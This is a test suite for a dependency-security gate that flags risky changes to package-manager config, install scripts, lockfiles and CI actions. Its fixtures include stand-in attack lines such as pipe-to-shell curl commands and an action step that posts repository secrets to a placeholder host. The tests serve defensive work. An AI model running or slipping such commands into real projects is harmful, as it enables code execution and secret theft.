import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { diffTrees } from "../src/diff.js";
import { RULES } from "../src/rules.js";
import { run } from "../src/main.js";
import type { Tree } from "../src/tree.js";
import { fingerprint } from "../src/types.js";
import { fakeIO, fx, testCtx } from "./helpers.js";

const IOCS = ["--iocs", fx("iocs")];
const CURL_SH = "curl -s https://a.invalid/x | sh";

/** The content hash diff appends to a key, and a key without it. */
const h32 = (text: string): string => createHash("sha256").update(text).digest("hex").slice(0, 32);
const unhashed = (key: string): string => key.replace(/:[0-9a-f]{32}$/, "");

function mem(files: Record<string, string>, label = "mem"): Tree {
  return { label, list: () => Object.keys(files), read: (p) => files[p] };
}

const npmLock = (packages: Record<string, object>, lockfileVersion = 3) => JSON.stringify({ lockfileVersion, packages: { "": {}, ...packages } });
const reg = (name: string, version: string, extra: object = {}) => ({ version, resolved: `https://registry.npmjs.org/${name}/-/${name}-${version}.tgz`, integrity: "sha512-x", ...extra });

/** A git repository with one commit per entry; each entry maps paths to contents (null deletes). */
function repo(...commits: Record<string, string | null>[]): string {
  const d = mkdtempSync(join(tmpdir(), "ws-gate-"));
  const git = (...a: string[]) => execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "-c", "commit.gpgsign=false", ...a], { cwd: d, stdio: "pipe" });
  git("init", "-q", "-b", "main");
  for (const [i, files] of commits.entries()) {
    for (const [p, text] of Object.entries(files)) {
      if (text === null) {
        git("rm", "-q", p);
        continue;
      }
      mkdirSync(dirname(join(d, p)), { recursive: true });
      writeFileSync(join(d, p), text);
    }
    git("add", "-A");
    git("commit", "-q", "--allow-empty", "-m", `c${i}`);
  }
  return d;
}

async function diffJson(args: string[]): Promise<{ code: number; findings: { ruleId: string; file: string; key: string; suppressed?: unknown }[]; err: string }> {
  const io = fakeIO();
  const code = await run(["diff", ...args, "--format", "json", ...IOCS], io);
  return { code, err: io.err, findings: code === 2 ? [] : (JSON.parse(io.out) as { findings: [] }).findings };
}

/* ---- gate configuration files ---- */
test("diff: adding, changing or removing package-manager config or the baseline is a high finding", () => {
  const base = mem({ ".npmrc": "ignore-scripts=true\n", ".pnpmfile.cjs": "module.exports = {}", "bunfig.toml": "[install]\n" });
  const head = mem({
    ".npmrc": "ignore-scripts=false\n",
    "pnpm-workspace.yaml": "minimumReleaseAge: 0\n",
    "app/.yarnrc.yml": "yarnPath: ./evil.cjs\n",
    ".yarnrc": 'yarn-path "./evil.js"\n',
    ".wormsign-baseline.json": '{"version":1,"entries":[]}',
    "bunfig.toml": "[install]\n",
    ".pnpmfile.mjs": "export const hooks = {}",
    ".yarn/releases/yarn-4.1.0.cjs": "require('child_process').exec('x')",
    ".yarn/plugins/@yarnpkg/plugin-x.cjs": "module.exports = {}",
    ".pnp.cjs": "/* pnp */",
    ".pnp.loader.mjs": "/* loader */",
  });
  const f = diffTrees(base, head, testCtx()).findings.filter((x) => x.ruleId === "WS-DF-005");
  assert.ok(f.every((x) => x.severity === "high"));
  assert.deepEqual(f.map((x) => `${x.file} ${x.key.split(":")[0]}`).sort(), [
    ".npmrc changed",
    ".pnp.cjs added",
    ".pnp.loader.mjs added",
    ".pnpmfile.cjs removed",
    ".pnpmfile.mjs added",
    ".wormsign-baseline.json added",
    ".yarn/plugins/@yarnpkg/plugin-x.cjs added",
    ".yarn/releases/yarn-4.1.0.cjs added",
    ".yarnrc added",
    "app/.yarnrc.yml added",
    "pnpm-workspace.yaml added",
  ]);
});

test("diff: rewriting the yarn release that yarnPath already points at is a high finding on its own", () => {
  const rc = { ".yarnrc.yml": "yarnPath: .yarn/releases/yarn-4.cjs\n" };
  const base = mem({ ...rc, ".yarn/releases/yarn-4.cjs": "/* yarn 4 */" });
  const head = mem({ ...rc, ".yarn/releases/yarn-4.cjs": 'require("child_process").exec("curl evil|sh")' });
  const f = diffTrees(base, head, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.file}`), ["WS-DF-005 high .yarn/releases/yarn-4.cjs"]);
});

test("diff: .env.yarn and .corepack.env are gate config: they change what package-manager commands run", () => {
  const head = mem({ ".env.yarn": "NODE_OPTIONS=--require=./scripts/telemetry.cjs\n", ".corepack.env": "COREPACK_ENABLE_UNSAFE_CUSTOM_URLS=1\n" });
  const f = diffTrees(mem({}), head, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.file}`).sort(), ["WS-DF-005 high .corepack.env", "WS-DF-005 high .env.yarn"]);
});

test("diff: setting or changing packageManager (or devEngines.packageManager) is a high finding", () => {
  const pkg = (o: object) => mem({ "package.json": JSON.stringify({ name: "p", ...o }) });
  const pm = (base: object, head: object) => diffTrees(pkg(base), pkg(head), testCtx()).findings.filter((x) => x.ruleId === "WS-DF-005");
  const url = { packageManager: "pnpm@http://127.0.0.1:43219/evil.js" };
  const added = pm({}, url);
  assert.deepEqual(added.map((x) => `${x.severity} ${x.file} ${x.key.split(":")[0]}`), ["high package.json packageManager"]);
  assert.equal(pm({ packageManager: "pnpm@9.0.0" }, url).length, 1, "changed");
  assert.equal(pm({}, { devEngines: { packageManager: { name: "yarn", version: "4.10.3" } } }).length, 1, "devEngines");
  assert.deepEqual(pm(url, { ...url, version: "2.0.0" }), [], "unchanged");
  assert.deepEqual(pm(url, {}), [], "removed: corepack falls back to its known-good release");
  assert.notEqual(added[0]?.key, pm({}, { packageManager: "pnpm@9.0.0" })[0]?.key, "the key follows the value");
});

test("diff: a hash-pinned packageManager bump stays high; the message shows the whole pin, says why, and how a maintainer approves it", () => {
  const pkg = (o: object) => mem({ "package.json": JSON.stringify({ name: "p", ...o }) });
  const pm = (base: object, head: object) => diffTrees(pkg(base), pkg(head), testCtx()).findings.filter((x) => x.ruleId === "WS-DF-005");
  const pin = (version: string, digit: string) => `pnpm@${version}+sha512.${digit.repeat(128)}`;
  // Ruling R16: a bump from one hash-pinned release to another is still high.
  const bump = pm({ packageManager: pin("9.12.0", "a") }, { packageManager: pin("9.12.1", "b") });
  assert.deepEqual(bump.map((x) => x.severity), ["high"]);
  const approval = "https://github.com/stgllghr/wormsign/blob/main/docs/baseline.md#reviewing-baseline-changes";
  assert.equal(
    bump[0]?.message,
    `packageManager set or changed in this change: corepack downloads and runs ${JSON.stringify([pin("9.12.1", "b")])}. This is high even when the value is pinned by hash, because it changes which package-manager binary runs every install and script here: a maintainer checks that the version and its hash are the package manager's own release, then merges with an override of the required check (${approval})`,
  );
  assert.match(readFileSync(join(import.meta.dirname, "..", "..", "docs", "baseline.md"), "utf8"), /^## Reviewing baseline changes$/m, "the section the message links to");
  // Both pins at once still fit whole; only a value longer than any real pin is cut, and then it says so.
  const both = pm({}, { packageManager: pin("9.12.1", "b"), devEngines: { packageManager: { name: "pnpm", version: pin("9.12.1", "b") } } });
  assert.ok(both[0]?.message.includes(`${"b".repeat(128)}"}]. This is high`), both[0]?.message);
  const long = pm({}, { packageManager: `pnpm@9.0.0+sha512.${"c".repeat(1000)}` });
  assert.match(long[0]?.message ?? "", /runs \["pnpm@9\.0\.0\+sha512\.c{380}\.\.\.\. This is high/);
  // The same for a script diff shows: cut at 120 characters, and marked.
  const script = diffTrees(pkg({}), pkg({ scripts: { postinstall: `node ${"x".repeat(200)}.js` } }), testCtx()).findings.find((x) => x.ruleId === "WS-DF-002");
  assert.equal(script?.message, `"postinstall" script added in this change: node ${"x".repeat(115)}...`);
});

test("diff: code that unchanged package-manager config points at is gated when it changes", () => {
  const config = {
    ".yarnrc.yml": 'yarnPath: "./tools/yarn.cjs"\nplugins:\n  # local plugins\n  - path: tools/plugin-a.cjs\n    spec: "@acme/plugin-a"\n  - tools/plugin-b.cjs\nnpmRegistryServer: "https://registry.npmjs.org"\n',
    ".yarnrc": 'yarn-path "./tools/yarn1.js"\n',
    "pnpm-workspace.yaml": "packages:\n  - packages/*\npnpmfile: [hooks/p.cjs, hooks/q.cjs]\nglobalPnpmfile: hooks/global.cjs\n",
    "packages/app/pnpm-workspace.yaml": "pnpmfile:\n# shared with the root\n  - ../../hooks/r.cjs # shared\n",
    ".npmrc": "pnpmfile = hooks/legacy.cjs\nscript-shell=./tools/sh\n",
    "app/.yarnrc.yml": "injectEnvironmentFiles:\n  - ci/settings.env\n  - .env.local?\n",
    "tools/notes.md": "",
  };
  const code = [
    ...["tools/yarn.cjs", "tools/plugin-a.cjs", "tools/plugin-b.cjs", "tools/yarn1.js", "hooks/p.cjs", "hooks/q.cjs", "hooks/r.cjs", "hooks/legacy.cjs"],
    ...["hooks/global.cjs", "tools/sh", "app/ci/settings.env", "app/.env.local"],
  ];
  const files = (text: string) => ({ ...config, ...Object.fromEntries(code.map((p) => [p, text])) });
  const base = mem(files("/* reviewed */"));
  const head = mem({ ...files('require("child_process").exec("curl -s https://a.invalid/x | sh")'), "tools/notes.md": "changed" });
  const f = diffTrees(base, head, testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.file}`).sort(), code.map((p) => `WS-DF-005 ${p}`).sort());
});

test("diff: an .npmrc setting that names code is followed in any case, with _ for -, as scan's WS-LC-004 reads it", () => {
  for (const key of ["Script_Shell", "SCRIPT-SHELL", "'script_shell'", "PNPMFILE", "global_pnpmfile", "Global-Pnpmfile"]) {
    const npmrc = { ".npmrc": `${key} = ./tools/sh.sh\n` };
    const f = diffTrees(mem({ ...npmrc, "tools/sh.sh": "#!/bin/sh\n" }), mem({ ...npmrc, "tools/sh.sh": "curl -s https://a.invalid/x | sh\n" }), testCtx()).findings;
    assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.file}`), ["WS-DF-005 high tools/sh.sh"], key);
  }
});

test("diff: config files are matched case-insensitively, as macOS and Windows open them", () => {
  const head = mem({
    ".NPMRC": "registry=https://evil.example/\n",
    ".YarnRC.yml": "yarnPath: ./tools/x.cjs\n",
    ".PNPMFILE.CJS": "module.exports = {}",
    ".Yarn/Releases/yarn.cjs": "/* x */",
    "pkg/PACKAGE.JSON": JSON.stringify({ scripts: { postinstall: CURL_SH } }),
    ".github/actions/x/Action.YML": "runs:\n  using: composite\n  steps: []\n",
  });
  const f = diffTrees(mem({}), head, testCtx(), { ignore: ["pkg", ".github"] }).findings.map((x) => `${x.ruleId} ${x.severity} ${x.file}`);
  for (const want of [
    "WS-DF-005 high .NPMRC",
    "WS-DF-005 high .YarnRC.yml",
    "WS-DF-005 high .PNPMFILE.CJS",
    "WS-DF-005 high .Yarn/Releases/yarn.cjs",
    "WS-DF-002 medium pkg/PACKAGE.JSON",
    "WS-DF-003 medium .github/actions/x/Action.YML",
  ]) {
    assert.ok(f.includes(want), want);
  }
  const yarnrc = { ".YARNRC.YML": "yarnPath: ./tools/y.cjs\n" };
  const viaConfig = diffTrees(mem({ ...yarnrc, "tools/y.cjs": "a" }), mem({ ...yarnrc, "tools/y.cjs": "b" }), testCtx()).findings;
  assert.deepEqual(viaConfig.map((x) => `${x.ruleId} ${x.file}`), ["WS-DF-005 tools/y.cjs"], "config named in any case is followed");
});

test("diff: a .npmrc or .yarnrc of blank lines does not stall the gate", () => {
  const blank = "\n".repeat(200_000);
  const start = Date.now();
  diffTrees(mem({}), mem({ ".npmrc": `${blank}registry=x\n`, ".yarnrc": `${blank}x y\n` }), testCtx());
  assert.ok(Date.now() - start < 1000, `took ${Date.now() - start} ms`);
});

test("diff: an added or changed package.yaml or package.json5 is a high finding, even under ignorePaths", () => {
  const yaml = "name: evil\nscripts:\n  postinstall: curl -s https://a.invalid/x | sh\n";
  const head = mem({ "packages/a/package.yaml": yaml, "packages/b/package.json5": "{scripts:{postinstall:'sh x'}}" });
  const f = diffTrees(mem({}), head, testCtx(), { ignore: ["packages"] }).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity} ${x.file}`).sort(), ["WS-DF-006 high packages/a/package.yaml", "WS-DF-006 high packages/b/package.json5"]);
  const same = mem({ "package.yaml": yaml });
  assert.deepEqual(diffTrees(same, same, testCtx()).findings, [], "unchanged is not reported");
});

test("diff: a workflow over the scan size cap is not checked, and that is a high finding", () => {
  const big = `on: push\n# ${"x".repeat(2 * 1024 * 1024)}\n`;
  const f = diffTrees(mem({}), mem({ ".github/workflows/big.yml": big }), testCtx()).findings;
  assert.deepEqual(f.map((x) => `${x.ruleId} ${x.severity}`).sort(), ["WS-DF-003 medium", "WS-DF-006 high"]);
  assert.match(f.find((x) => x.ruleId === "WS-DF-006")?.message ?? "", /larger than 2 MiB/);
});

test("diff: a gate-config finding's fingerprint follows the content, so one baseline entry cannot accept later edits", () => {
  const fp = (npmrc: string) => diffTrees(mem({}), mem({ ".npmrc": npmrc }), testCtx()).findings[0]?.fingerprint;
  assert.ok(fp("a=1\n"));
  assert.notEqual(fp("a=1\n"), fp("a=2\n"));
});

/* ---- install-time scripts and local actions ---- */
test("diff: every root script npm, pnpm or yarn runs on install is reported", () => {
  const names = ["preinstall", "install", "postinstall", "prepublish", "preprepare", "prepare", "postprepare", "predependencies", "dependencies", "postdependencies", "pnpm:devPreinstall"];
  for (const name of names) {
    const head = mem({ "package.json": JSON.stringify({ scripts: { [name]: CURL_SH } }) });
    const keys = diffTrees(mem({ "package.json": "{}" }), head, testCtx()).findings.map((x) => `${x.ruleId} ${unhashed(x.key)}`);
    assert.ok(keys.includes(`WS-DF-002 ${name}:added`), name);
  }
  const notInstall = mem({ "package.json": JSON.stringify({ scripts: { test: CURL_SH } }) });
  assert.deepEqual(diffTrees(mem({ "package.json": "{}" }), notInstall, testCtx()).findings, [], "a script an install does not run is not reported");
});

test("diff: root prepare-family scripts run on npm install, so changing them is reported with content checks", () => {
  const head = mem({ "package.json": JSON.stringify({ scripts: { prepare: CURL_SH, prepublish: "node p.js", test: "node --test" } }) });
  const f = diffTrees(mem({ "package.json": "{}" }), head, testCtx()).findings;
  assert.deepEqual(f.filter((x) => x.ruleId === "WS-DF-002").map((x) => unhashed(x.key)).sort(), ["prepare:added", "prepublish:added"]);
  assert.ok(f.some((x) => x.ruleId === "WS-LC-002" && x.key === `prepare:suspicious:${h32(CURL_SH)}`));
});

test("diff: paths are matched as APFS matches them, so a long s or a case change does not hide what an install runs", () => {
  const gated = (base: Record<string, string>, head: Record<string, string>) =>
    diffTrees(mem(base), mem(head), testCtx()).findings.filter((f) => f.ruleId === "WS-DF-005").map((f) => f.file);
  assert.deepEqual(gated({}, { ".pnpmfile.cj\u017f": "x" }), [".pnpmfile.cj\u017f"]);
  assert.deepEqual(gated({}, { ".yarn/relea\u017fes/yarn-4.10.3.cjs": "x" }), [".yarn/relea\u017fes/yarn-4.10.3.cjs"]);
  const street = { ".yarnrc.yml": "yarnPath: ./Stra\u00dfe.cjs\n", "Stra\u00dfe.cjs": "reviewed" };
  assert.deepEqual(gated(street, { ...street, "Stra\u1e9ee.cjs": "evil" }), ["Stra\u1e9ee.cjs"], "APFS opens capital sharp s as ß");
  const yarn = { ".yarnrc.yml": "yarnPath: ./Tools/X.cjs\n", "Tools/X.cjs": "reviewed" };
  assert.deepEqual(gated(yarn, { ...yarn, "tools/X.cjs": "evil" }), ["tools/X.cjs"], "git checks it out over Tools/X.cjs on a Mac");
});

test("diff: a changed local action is reported like a workflow", () => {
  const base = mem({ ".github/actions/setup/action.yml": "runs:\n  using: composite\n  steps: []\n" });
  const head = mem({ ".github/actions/setup/action.yml": "runs:\n  using: composite\n  steps:\n    - run: echo hi\n      shell: bash\n" });
  const f = diffTrees(base, head, testCtx()).findings.filter((x) => x.ruleId === "WS-DF-003");
  assert.deepEqual(f.map((x) => `${x.file}:${unhashed(x.key)}`), [".github/actions/setup/action.yml:modified"]);
});

/* ---- ignorePaths ---- */
test("diff: ignorePaths hide lockfile and workflow content in fixtures", () => {
  const head = mem({
    "fixtures/package-lock.json": npmLock({ "node_modules/x": reg("x", "1.0.0", { hasInstallScript: true }) }),
    "fixtures/.github/workflows/ci.yml": "on: push\njobs: {}\n",
  });
  const base = mem({ "fixtures/yarn.lock": "" });
  assert.ok(diffTrees(base, head, testCtx()).findings.length >= 3, "positive control: reported when not ignored");
  assert.deepEqual(diffTrees(base, head, testCtx(), { ignore: ["fixtures"] }).findings, []);
});

test("diff: ignorePaths never hide install-time scripts or package-manager config", () => {
  const head = mem({ "fixtures/package.json": JSON.stringify({ scripts: { postinstall: CURL_SH } }), "fixtures/.npmrc": "x=1\n" });
  const keys = diffTrees(mem({}), head, testCtx(), { ignore: ["fixtures"] }).findings.map((x) => `${x.ruleId} ${x.file}`);
  assert.ok(keys.includes("WS-DF-002 fixtures/package.json"));
  assert.ok(keys.includes("WS-DF-005 fixtures/.npmrc"));
});

test("diff: ignorePaths never hide pip or uv configuration ([tool.uv] included), and do hide a Python manifest's dependency changes", () => {
  const base = mem({ "fixtures/py/pyproject.toml": '[project]\nname = "p"\ndependencies = ["six"]\n' });
  const head = mem({
    "fixtures/py/pyproject.toml": '[project]\nname = "p"\ndependencies = ["six", "requests"]\n[tool.uv]\nno-build-isolation = true\n',
    "fixtures/py/pip.conf": "[global]\nindex-url = https://pypi.corp.example/simple/\n",
    "fixtures/py/uv.toml": "no-binary = true\n",
  });
  const keys = (ignore: string[]) => diffTrees(base, head, testCtx(), { ignore }).findings.map((x) => `${x.ruleId} ${x.severity} ${x.file}`).sort();
  const config = ["WS-DF-005 high fixtures/py/pip.conf", "WS-DF-005 high fixtures/py/pyproject.toml", "WS-DF-005 high fixtures/py/uv.toml"];
  assert.deepEqual(keys([]), [...config, "WS-DF-006 medium fixtures/py/pyproject.toml"].sort(), "positive control");
  assert.deepEqual(keys(["fixtures"]), config);
});

test("diff: ignorePaths never hide a local action, which a workflow can run with uses: ./path", () => {
  const action = "runs:\n  using: composite\n  steps:\n    - shell: bash\n      run: |\n        echo \"${{ toJSON(secrets) }}\" | curl -d @- https://a.invalid/c\n";
  const head = mem({ "test/fixtures/evil/action.yml": action, "test/fixtures/evil/payload.yml": action });
  const keys = (ignore: string[]) => diffTrees(mem({}), head, testCtx(), { ignore }).findings.map((x) => `${x.ruleId} ${x.severity} ${x.file}`);
  const shown = keys([]);
  assert.ok(shown.includes("WS-GH-002 high test/fixtures/evil/action.yml"), "positive control");
  assert.deepEqual(keys(["test/fixtures"]), shown);
  assert.ok(shown.includes("WS-DF-003 medium test/fixtures/evil/action.yml"));
  assert.ok(!shown.some((k) => k.endsWith("payload.yml")), "only action.yml is an action");
});

test("diff: a workspace added under an ignored directory still has its postinstall reported", async () => {
  const ignore = { version: 1, entries: [], ignorePaths: [{ path: "test/fixtures", justification: "Inert fixtures used by the test suite" }] };
  const d = repo(
    { "package.json": '{"name":"r"}', ".wormsign-baseline.json": JSON.stringify(ignore) },
    {
      "package.json": JSON.stringify({ name: "r", workspaces: ["test/fixtures/evil"] }),
      "test/fixtures/evil/package.json": JSON.stringify({ name: "evil", scripts: { postinstall: CURL_SH } }),
    },
  );
  const r = await diffJson(["HEAD~1", "HEAD", "--dir", d]);
  assert.equal(r.code, 1);
  assert.ok(r.findings.some((f) => f.ruleId === "WS-DF-002" && f.file === "test/fixtures/evil/package.json"));
});

/* ---- lockfiles ---- */
test("diff: removing a lockfile is a high finding; a changed bun lockfile is a high unchecked finding", () => {
  const base = mem({ "package.json": '{"dependencies":{"x":"^1.0.0"}}', "package-lock.json": npmLock({ "node_modules/x": reg("x", "1.0.0") }) });
  const head = mem({ "package.json": '{"dependencies":{"x":"^1.0.0"}}', "bun.lock": "{}" });
  const r = diffTrees(base, head, testCtx());
  assert.deepEqual(r.findings.map((x) => `${x.ruleId} ${x.severity} ${x.file} ${x.key.split(":")[0]}`).sort(), [
    "WS-DF-005 high package-lock.json removed",
    "WS-DF-006 high bun.lock unsupported",
  ]);
  const ignored = diffTrees(base, head, testCtx(), { ignore: ["package-lock.json", "bun.lock"] }).findings;
  assert.deepEqual(ignored, [], "an ignored lockfile is noise");
  const same = mem({ "bun.lockb": "\u0000bun" });
  assert.deepEqual(diffTrees(same, same, testCtx()).findings, [], "an unchanged bun lockfile is not reported");
});

test("diff: a problem entry that was already in the base lockfile is not reported again", () => {
  const offRegistry = { version: "1.0.0", resolved: "https://evil.example/old-1.0.0.tgz", integrity: "sha512-x" };
  const base = mem({ "package-lock.json": npmLock({ "node_modules/old": offRegistry }) });
  const head = mem({ "package-lock.json": npmLock({ "node_modules/old": offRegistry, "node_modules/fresh": reg("fresh", "1.0.0") }) });
  assert.ok(!diffTrees(base, head, testCtx()).findings.some((x) => x.ruleId === "WS-LK-002"));
  assert.ok(diffTrees(mem({}), head, testCtx()).findings.some((x) => x.ruleId === "WS-LK-002" && x.key.startsWith("old@1.0.0 ")), "positive control");
});

test("diff: an entry whose name@version stays but whose tarball or integrity changes is checked as new", () => {
  const base = mem({ "package-lock.json": npmLock({ "node_modules/x": reg("x", "1.0.0"), "node_modules/y": reg("y", "1.0.0") }) });
  const head = mem({
    "package-lock.json": npmLock({
      "node_modules/x": reg("x", "1.0.0", { resolved: "https://evil.example/x-1.0.0.tgz" }),
      "node_modules/y": reg("y", "1.0.0", { resolved: "https://registry.npmjs.org/wormsign-test-marker/-/wormsign-test-marker-1.0.0.tgz", integrity: "sha512-y" }),
    }),
  });
  const f = diffTrees(base, head, testCtx()).findings.map((x) => `${x.ruleId} ${x.severity} ${x.key.split(" ")[0]}`);
  for (const want of ["WS-LK-002 high x@1.0.0", "WS-LK-001 critical y@1.0.0", "WS-LK-002 high y@1.0.0"]) assert.ok(f.includes(want), want);
});

test("diff: the same name@version at several lockfile paths is reported once", () => {
  const x = reg("x", "1.0.0", { hasInstallScript: true });
  const head = mem({ "package-lock.json": npmLock({ "node_modules/a/node_modules/x": x, "node_modules/b/node_modules/x": x }) });
  assert.equal(diffTrees(mem({}), head, testCtx()).findings.filter((f) => f.ruleId === "WS-DF-001").length, 1);
});

test("diff: the install-script note follows what the lockfile format records, not its package manager", () => {
  const notes = (path: string, text: string) => diffTrees(mem({}), mem({ [path]: text }), testCtx());
  const v1 = JSON.stringify({ lockfileVersion: 1, dependencies: { x: reg("x", "1.0.0") } });
  assert.ok(notes("package-lock.json", v1).notes.some((n) => n.includes("does not record install scripts")), "npm v1 has no hasInstallScript");
  assert.ok(!notes("package-lock.json", npmLock({ "node_modules/x": reg("x", "1.0.0") })).notes.some((n) => n.includes("does not record")));
  const pnpm6 = "lockfileVersion: '6.0'\n\npackages:\n\n  /esbuild@0.18.0:\n    resolution: {integrity: sha512-x}\n    requiresBuild: true\n";
  const r6 = notes("pnpm-lock.yaml", pnpm6);
  assert.ok(r6.findings.some((f) => f.ruleId === "WS-DF-001" && f.key === "esbuild@0.18.0"));
  assert.ok(!r6.notes.some((n) => n.includes("does not record")), "pnpm v6 records requiresBuild");
  const pnpm9 = "lockfileVersion: '9.0'\n\npackages:\n\n  esbuild@0.18.0:\n    resolution: {integrity: sha512-x}\n";
  assert.ok(notes("pnpm-lock.yaml", pnpm9).notes.some((n) => n.includes("does not record install scripts")));
});

test("diff: an unparseable changed lockfile or package.json fails closed; a BOM does not hide scripts", () => {
  const bad = diffTrees(mem({}), mem({ "package-lock.json": "{ not json", "package.json": "{ nope" }), testCtx()).findings;
  assert.deepEqual(bad.filter((f) => f.ruleId === "WS-DF-006" && f.severity === "high").map((f) => f.file).sort(), ["package-lock.json", "package.json"]);
  const bom = diffTrees(mem({}), mem({ "package.json": `\ufeff${JSON.stringify({ scripts: { postinstall: CURL_SH } })}` }), testCtx()).findings;
  assert.ok(bom.some((f) => f.ruleId === "WS-DF-002" && unhashed(f.key) === "postinstall:added"));
  const badBase = diffTrees(mem({ "package-lock.json": "{" }), mem({ "package-lock.json": npmLock({}) }), testCtx());
  assert.ok(!badBase.findings.some((f) => f.ruleId === "WS-DF-006"), "an unparseable base only over-reports");
  assert.ok(badBase.notes.some((n) => n.includes("could not parse package-lock.json")));
});

/* ---- revisions vs directories ---- */
test("diff: a directory named like a revision never replaces the revision", async () => {
  const d = repo({ "package.json": '{"name":"p"}' }, { "package.json": JSON.stringify({ name: "p", scripts: { postinstall: CURL_SH } }), "HEAD/package.json": '{"name":"decoy"}' });
  const cwd = process.cwd();
  process.chdir(d);
  try {
    const r = await diffJson(["HEAD~1", "HEAD"]);
    assert.equal(r.code, 1);
    assert.ok(r.findings.some((f) => f.ruleId === "WS-LC-002" && f.file === "package.json"));
  } finally {
    process.chdir(cwd);
  }
});

test("diff: directories need the dir: prefix", async () => {
  // In a repository of its own, so the hint is tested in a copy of wormsign that is not a git checkout too.
  const plain = await diffJson([fx("diff", "base"), fx("diff", "head"), "--dir", repo({ "a.txt": "a" })]);
  assert.equal(plain.code, 2);
  assert.match(plain.err, /write dir:/);
  assert.equal((await diffJson([`dir:${fx("diff", "base")}`, `dir:${fx("diff", "head")}`])).code, 1);
  assert.equal((await diffJson([`dir:${fx("diff", "nope")}`, `dir:${fx("diff", "head")}`])).code, 2);
});

/* ---- monorepo subdirectory ---- */
test("diff: from a monorepo subdirectory the whole commit is compared, with repository-root paths", async () => {
  const d = repo(
    { "package.json": '{"name":"root","workspaces":["packages/app"]}', "packages/app/package.json": '{"name":"app"}' },
    { "packages/app/package.json": JSON.stringify({ name: "app", scripts: { postinstall: CURL_SH } }), ".npmrc": "registry=https://evil.example/\n" },
  );
  const fromRoot = await diffJson(["HEAD~1", "HEAD", "--dir", d]);
  const fromApp = await diffJson(["HEAD~1", "HEAD", "--dir", join(d, "packages", "app")]);
  assert.equal(fromApp.code, 1);
  const files = (r: typeof fromApp) => r.findings.map((f) => `${f.ruleId} ${f.file}`).sort();
  assert.deepEqual(files(fromApp), files(fromRoot));
  assert.ok(files(fromApp).includes("WS-LC-002 packages/app/package.json"));
  assert.ok(files(fromApp).includes("WS-DF-005 .npmrc"), "root config governs the member's install");
  assert.equal((await diffJson(["HEAD~1", "HEAD", "--dir", tmpdir()])).code, 2, "outside a repository is a usage error");
});

/* ---- baseline comes from the base revision ---- */
test("diff: a baseline added by the change does not suppress that change's findings", async () => {
  const pkg = JSON.stringify({ name: "p", scripts: { postinstall: CURL_SH } });
  const own = [`WS-DF-002:postinstall:added:${h32(CURL_SH)}`, `WS-LC-002:postinstall:suspicious:${h32(CURL_SH)}`].map((k) => {
    const [rule, ...key] = k.split(":");
    return { fingerprint: fingerprint(rule as string, "package.json", key.join(":")), justification: "Reviewed and accepted by the author" };
  });
  const d = repo({ "package.json": '{"name":"p"}' }, { "package.json": pkg, ".wormsign-baseline.json": JSON.stringify({ version: 1, entries: own }) });
  const r = await diffJson(["HEAD~1", "HEAD", "--dir", d]);
  assert.equal(r.code, 1);
  const mine = r.findings.filter((f) => f.ruleId === "WS-DF-002" || f.ruleId === "WS-LC-002");
  assert.equal(mine.length, 2);
  assert.ok(mine.every((f) => f.suppressed === undefined), "head's baseline must not apply");
  assert.ok(r.findings.some((f) => f.ruleId === "WS-DF-005" && f.file === ".wormsign-baseline.json"));
});

test("diff: the base revision's baseline still applies, to the reviewed script only", async () => {
  const entry = { fingerprint: fingerprint("WS-DF-002", "package.json", `postinstall:added:${h32("node build.js")}`), justification: "Native build step, reviewed in #12" };
  const gate = async (postinstall: string) => {
    const d = repo(
      { "package.json": '{"name":"p"}', ".wormsign-baseline.json": JSON.stringify({ version: 1, entries: [entry] }) },
      { "package.json": JSON.stringify({ name: "p", scripts: { postinstall } }) },
    );
    const io = fakeIO();
    return { code: await run(["diff", "HEAD~1", "HEAD", "--dir", d, "--fail-on", "medium", ...IOCS], io), out: io.out };
  };
  const reviewed = await gate("node build.js");
  assert.equal(reviewed.code, 0);
  assert.match(reviewed.out, /1 baselined/);
  assert.equal((await gate("node build2.js")).code, 1, "an entry for one script does not accept a different one");
});

test("diff: a baselined suspicious script does not accept a different one at the default gate", async () => {
  const pkg = (postinstall: string) => JSON.stringify({ name: "p", scripts: { postinstall } });
  const reviewed = diffTrees(mem({}), mem({ "package.json": pkg(CURL_SH) }), testCtx()).findings;
  assert.ok(reviewed.some((f) => f.ruleId === "WS-LC-002"), "positive control: the high finding exists");
  const entries = reviewed.map((f) => ({ fingerprint: f.fingerprint, justification: "Reviewed and accepted in #12" }));
  const gate = async (postinstall: string) => {
    const d = repo(
      { "package.json": '{"name":"p"}', ".wormsign-baseline.json": JSON.stringify({ version: 1, entries }) },
      { "package.json": pkg(postinstall) },
    );
    return run(["diff", "HEAD~1", "HEAD", "--dir", d, ...IOCS], fakeIO());
  };
  assert.equal(await gate(CURL_SH), 0, "the reviewed script is accepted");
  assert.equal(await gate("curl -s https://b.invalid/EVIL | sh"), 1);
});

test("diff: workflow and unreadable-file findings follow the content, so a baseline entry accepts one version", () => {
  const key = (path: string, text: string, ruleId: string) => diffTrees(mem({}), mem({ [path]: text }), testCtx()).findings.find((f) => f.ruleId === ruleId)?.key;
  assert.equal(key(".github/workflows/a.yml", "on: push\n", "WS-DF-003"), `added:${h32("on: push\n")}`);
  assert.notEqual(key(".github/workflows/a.yml", "on: push\n", "WS-DF-003"), key(".github/workflows/a.yml", "on: pull_request\n", "WS-DF-003"));
  assert.notEqual(key("package.json", "{ a", "WS-DF-006"), key("package.json", "{ b", "WS-DF-006"));
});

test("diff: every rule diff reports is in the rule catalogue, so SARIF output describes it", () => {
  const head = mem({
    ".npmrc": "x=1\n",
    "bun.lock": "{}",
    "package.json": JSON.stringify({ scripts: { postinstall: CURL_SH } }),
    "a/package.json": "{",
    ".github/workflows/w.yml": "on: push\n",
    "package-lock.json": npmLock({ "node_modules/x": reg("x", "1.0.0", { hasInstallScript: true }) }),
  });
